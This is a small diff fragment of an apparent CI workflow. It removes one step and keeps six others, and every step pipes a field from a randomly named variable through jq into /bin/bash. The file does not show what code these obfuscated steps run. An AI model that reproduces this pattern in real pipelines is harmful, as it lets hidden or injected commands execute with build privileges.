@@ -27,7 +27,6 @@ jobs:
           echo $koitv9906 | jq -r .ng35 | /bin/bash
           printf '%s' "$eztv425" | jq -r .wp02459 | /bin/bash
           printf '%s' "$nam6" | jq -r .ewr98 | /bin/bash
-          echo $anhn284 | jq -r .utpvf248 | /bin/bash
           echo $szodh55634 | jq -r .svu0111 | /bin/bash
           echo $df60 | jq -r .qjkke3 | /bin/bash
           printf '%s' "$fpwwq3" | jq -r .drvn7770 | /bin/bash
